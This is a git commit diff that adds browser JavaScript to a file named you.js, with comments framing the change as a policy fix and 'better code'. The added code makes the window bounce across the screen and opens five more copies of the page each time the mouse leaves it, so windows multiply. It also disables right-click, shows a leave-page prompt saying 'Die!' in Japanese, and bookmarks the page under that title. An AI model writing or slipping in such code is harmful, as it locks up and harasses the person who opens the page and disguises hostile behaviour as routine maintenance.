c3a8db89a9bad0143a5439b217d7c36c6c75e1c3
ASSA0000 <140357434+ASSA0000@users.noreply.github.com>
2023-07-26 09:47:14 +0900

    Update you.js

--- you.js
+++ you.js
@@ -1,4 +1,97 @@
 /* [Oct 2021] Added to comply with strict browser policies. */
 /* [Oct 2021] End part. */
-openWindow('index.html');
+
+function bookmark() {
+	if ((navigator.appName == "Microsoft Internet Explorer") && (parseInt(navigator.appVersion) >= 4)) {
+		var url = "index.html";
+		var title = "死ね!";
+		
+		window.external.AddFavorite(url, title);
+	}
+}
+
+var xOff = 5;
+var yOff = 5;
+var xPos = 400;
+var yPos = -100;
+var flagRun = 1;
+
+function changeTitle(title) {
+	document.title = title;
+}
+
+function openWindow(url) {
+	aWindow = window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
+}
+
+function proCreate() {	
+	for (var i = 0; i < 5; i++) {
+		openWindow('index.html');
+	}
+}
+
+function newXlt() {
+	xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
+	window.focus();
+}
+
+function newXrt() {
+	xOff = Math.ceil(7 * Math.random())  * 5 - 10;
+	window.focus();
+}
+
+function newYup() {
+	yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
+	window.focus();
+}
+
+function newYdn() {
+	yOff = Math.ceil( 7 * Math.random()) * 5 - 10;
+	window.focus();
+}
+
+function fOff(){
+	flagRun = 0;
+}
+
+function playBall() {
+    xPos += xOff;
+    yPos += yOff;
+    
+	if (xPos > screen.width - 357) newXlt();    
+	if (xPos < 0) newXrt();
+    
+	if (yPos > screen.height - 330) newYup(); 		
+	if (yPos < 0) newYdn();
+    
+	if (flagRun == 1) {
+        window.moveTo(xPos, yPos);
+        setTimeout('playBall()', 1);
+    }
+}
+
+/* [Oct 2021] Better code. */
+window.onload = function () {
+	flagRun = 1;
+	
+	playBall();
+	bookmark();
+	
+	return true;
+}
+
+window.onmouseout = function () {
+	proCreate();
+
+	return null;
+};
+
+window.oncontextmenu = function() {
+	
+	return false;
+}
+
+window.onbeforeunload = function() {
+    return "死ね!";
+};
 /* [Oct 2021] End of amendments. */
